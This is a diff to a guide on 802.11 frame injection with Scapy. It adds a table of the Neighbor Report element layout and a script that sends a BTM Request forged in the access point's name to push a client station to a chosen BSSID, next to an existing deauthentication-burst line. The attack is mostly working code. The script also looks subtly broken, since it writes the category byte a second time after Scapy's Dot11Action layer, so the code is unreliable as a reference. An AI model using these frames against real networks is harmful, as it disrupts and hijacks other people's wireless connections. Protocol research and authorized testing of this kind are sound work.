@@ -57,23 +57,55 @@ sendp(deauth, iface="wlan1mon", count=5, inter=0.1)
 
 ## A BTM Request Action frame
 
-Action frames use `type=0, subtype=13`. The body is (Category,
-Action, Dialog Token, and category-specific fields).
+Action frames use `type=0, subtype=13`. The body is (Category = 10
+WNM, Action = 7 BTM Request, Dialog Token, Request Mode, Disassoc
+Timer, Validity Interval, and optional Neighbor Report Elements).
+
+The Neighbor Report Element (Element ID 52, length 13) layout:
+
+```
++----+--------+---------+------------+------------+----------+---------+----------+
+| ID | Length | BSSID   | BSSID Info | Op. Class  | Channel  | PHY Type| (subelts)|
+| 52 | 13     | 6 bytes | 4 bytes    | 1 byte     | 1 byte   | 1 byte  | optional |
++----+--------+---------+------------+------------+----------+---------+----------+
+```
+
+Total Neighbor Report Element without subelements: 2-byte header +
+13-byte body = 15 bytes.
 
 ```python
-category = b"\x0a"    # WNM
-action   = b"\x07"    # BSS Transition Management Request
-body = category + action + b"\x01"  # dialog token = 1
-# Request Mode + Disassoc Timer + Validity + Neighbor Report Element
-body += b"\x00\x00\x00\x00\x00\x00" + b"\x34\x0d..."  # Neighbor Report
+from scapy.all import RadioTap, Dot11, Dot11Action, Raw, sendp
 
-btm = (
+STA       = "11:22:33:44:55:66"
+AP_BSSID  = "aa:bb:cc:dd:ee:ff"
+
+dialog_token       = 0x01
+request_mode       = 0x00              # no preferred candidate list required
+disassoc_timer_le  = 0x00              # 2-byte little-endian: 0 TBTTs
+disassoc_timer_be  = 0x00
+validity_interval  = 0xff              # 255 TBTTs
+
+# 6-byte neighbor BSSID: 12:34:56:78:9a:bc
+NEIGHBOR_BSSID_BYTES = bytes.fromhex("1234 5678 9abc".replace(" ", ""))
+
+btm_req = (
     RadioTap() /
     Dot11(type=0, subtype=13,
-          addr1=TARGET, addr2=BSSID, addr3=BSSID) /
-    body
+          addr1=STA, addr2=AP_BSSID, addr3=AP_BSSID) /
+    Dot11Action() /
+    # Category = 10 (WNM), Action = 7 (BTM Request)
+    Raw(load=bytes([0x0a, 0x07, dialog_token, request_mode,
+                    disassoc_timer_le, disassoc_timer_be,
+                    validity_interval])) /
+    # Neighbor Report Element (IE 52)
+    Raw(load=bytes([52, 13,                    # id, length = 13 bytes body
+                    *NEIGHBOR_BSSID_BYTES,     # 6 B BSSID
+                    0x00, 0x00, 0x00, 0x00,    # BSSID Info (reachability bits)
+                    115,                        # Operating Class (5 GHz)
+                    36,                         # Channel Number (5.180 GHz)
+                    9]))                        # PHY Type (VHT = 9)
 )
-sendp(btm, iface="wlan1mon")
+sendp(btm_req, iface="wlan1mon")
 ```
 
 Malformed BTM bodies are silently dropped by most drivers — validate
